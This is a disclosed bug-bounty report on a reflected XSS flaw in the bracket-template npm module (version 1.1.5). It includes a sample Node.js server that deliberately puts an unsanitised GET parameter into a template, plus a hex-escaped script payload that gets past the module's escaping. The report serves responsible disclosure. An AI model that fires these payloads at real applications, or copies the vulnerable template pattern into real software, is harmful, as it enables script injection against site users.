# [bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template

## Report Details
- **Report ID**: 317125
- **URL**: https://hackerone.com/reports/317125
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-02-17T14:19:09.371Z
- **Disclosed**: 2018-04-09T14:58:19.748Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

I would like to report Reflected XSS in bracket-template module.
It allows to inject arbitrary JavaScript tag and malicious code to execute when variables read from GET are used directly in template without sanitization.

## Module

**module name:** bracket-template
**version:** 1.1.5
**npm page:** https://www.npmjs.com/package/bracket-template

### Description

Minimal (über fast) Javascript engine compatible with node.js and browsers.

### Module Stats

Stats:

51 downloads in the last day
209 downloads in the last week
835 downloads in the last month

~10000 estimated downloads per year

## Description

While testing ```bracket-template``` module, I've found that there is possibility to inject malicious ```<script>``` tag followed by JavaScript code when values passed via GET are used in templates directly, without any sanitization.

## Steps To Reproduce:

- install ```bracket-template``` module:

```
$ npm install bracket-template
```

- create sample aaplication, which reads ```name``` from url and displays welcome message in the browser:

```javascript
// app.js file
const http = require('http')
const bracket = require('bracket-template').default
const port = 8080

function createHTML(name) {
    let tpl = `
        [[ const n = '${name}'; ]]
        <strong>Hello [[= n ]]</strong>
    `
    return bracket.compile(tpl)
}

const requestHandler = (request, response) => {
    const name = request.url.split('=')[1]
    response.writeHeader(200, { "Content-Type": "text/html" });
    response.write(createHTML(name)());
    response.end();
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log(err)
    }
    console.log(`server is listening on ${port}`)
})
```

- run application:

```
$ node app.js
```

- open ```http://localhost:8080?name=bl4de``` in the browser. You will notice expected result:

{F264368}

- now, try to inject following malicious XSS payload: ```http://localhost:8080?name=bl4de<script>console.log('XSS?')</script>```. You will notice all HTML special characters were escaped:

{F264369}


- this time, use following payload: ```http://localhost:8080/?name=bl4de\x3cscript\x3econsole.log(\x22uh\x20oh,\x20XSS...\x20:(\x22)\x3c\x2fscript\x3e``` and see the result in browser dev tools console:


{F264370}


When we investigate HTML returned from the server, we can notice using ```\x[hex][hex]``` notation allows to inject any HTML special character and crafts XSS payload:

```HTML
<strong>Hello bl4de<script>console.log("uh oh, XSS... :(")</script></strong>
```

Also, I have noticed that this vector is not detected by built-in XSS protection (XSS Auditor) in Blink/WebKit based browsers (Chromium, Safari, Chrome, Opera), which causes additional risk for anyone who uses ```bracket-template``` in production application.


## Supporting Material/References:

This issue was found and tested with following setup:

- macOS HighSierra 10.13.3
- Node.js v.8.9.3
- npm v. 5.5.1
- Chromium 66.0.3342.0, Safari 11.03 (with XSS Auditor enabled), Chrome 64.0.3282.167 (with XSS Auditor enabled)

## Wrap up

- I contacted the maintainer to let him know: No
- I opened an issue in the related repository: No

Regards,

Rafal 'bl4de' Janicki

## Impact

This issue can be used by malicious user to exploit Reflected XSS against application  which outputs variables passed via GET parameters directly in template(s) without any sanitization.

## Attachments
- 1.png
- 2.png
- 3.png
